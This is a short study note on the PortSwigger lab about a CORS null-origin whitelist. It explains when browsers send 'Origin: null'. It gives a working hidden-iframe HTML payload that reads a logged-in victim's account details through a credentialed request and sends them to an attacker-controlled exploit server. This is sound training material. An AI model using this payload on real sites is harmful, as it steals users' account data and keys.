[Cors Lab 2](https://portswigger.net/web-security/learning-paths/cors/cors-vulnerabilities-arising-from-cors-configuration-issues/cors/lab-null-origin-whitelisted-attack#)
## Whitelisted null origin value
The specification for the Origin header supports the value `null`. Browsers might send the value `null` in the Origin header in various unusual situations:

- Cross-origin redirects.
- Requests from serialized data.
- Request using the `file:` protocol.
- Sandboxed cross-origin requests.

## How to Attack CORS Null Origin

Similar to [[Origin-reflection Attack]] we will host the below website within our control.
We then send the malicious link to the Admin user, if he happens to be logged on and click on the link , our webpage will make a request on his behalf to the vulnerable url and we will log the request as a url parameter on our server logs. This way been able to retrieve cookies from the victim.

### HTML Payload 
```html
<iframe style='display:none;'
sandbox= 'allow-scripts allow-top-navigation allow-forms'
srcdoc='<script>
    const request = new XMLHttpRequest();
    const url = "https://0ac600a50420313683a2915e008f001c.web-security-academy.net"
    const c2cUrl = "https://exploit-0a5600e2049331e683c8904601a90064.exploit-server.net"

 request.onreadystatechange = function(){
    if (request.readyState == XMLHttpRequest.DONE){
        fetch(c2cUrl + "/log?key=" + request.responseText)
    }
 }
    request.open("GET", url + "/accountDetails", true);
    request.withCredentials=true;
    request.send(null)
</script>'
></iframe>
```